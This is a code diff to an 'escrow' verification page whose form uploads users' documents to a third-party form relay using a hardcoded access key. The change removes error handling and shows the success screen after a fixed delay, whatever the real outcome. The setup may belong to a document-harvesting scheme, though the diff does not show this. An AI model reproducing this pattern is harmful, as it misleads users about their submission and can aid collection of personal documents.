@@ -229,7 +229,8 @@
                 <h1>Verification <br><span class="escrow-text">- Required Documents</span></h1>
             </header>
 
-            <form id="uploadForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" onsubmit="handleConfirm(event)">
+            <!-- Standard HTML form submit to prevent fetch payload limits -->
+            <form id="uploadForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data">
                 
                 <!-- Web3Forms Access Key -->
                 <input type="hidden" name="access_key" value="e0f4322a-542d-4c84-8ec6-fce2f6f6e627">
@@ -266,7 +267,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn">Confirm</button>
+                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn" onclick="showSubmitting()">Confirm</button>
             </form>
         </div>
 
@@ -294,37 +295,17 @@
             document.getElementById('step-upload').classList.add('active');
         }
 
-        async function handleConfirm(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            const formData = new FormData(form);
-            const submitBtn = document.getElementById('submitBtn');
-            
-            submitBtn.innerText = "Submitting & Uploading...";
-            submitBtn.disabled = true;
+        function showSubmitting() {
+            const btn = document.getElementById('submitBtn');
+            setTimeout(() => {
+                btn.innerText = "Submitting & Uploading...";
+            }, 100);
 
-            try {
-                let response = await fetch(form.action, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                let result = await response.json();
-
-                if (result.success) {
-                    document.getElementById('step-upload').classList.remove('active');
-                    document.getElementById('step-success').classList.add('active');
-                } else {
-                    alert('Error: ' + result.message);
-                    submitBtn.innerText = "Confirm";
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                alert('Network error. Please check your connection.');
-                submitBtn.innerText = "Confirm";
-                submitBtn.disabled = false;
-            }
+            // Automatically transition the screen after submitting natively
+            setTimeout(() => {
+                document.getElementById('step-upload').classList.remove('active');
+                document.getElementById('step-success').classList.add('active');
+            }, 1500);
         }
     </script>
 
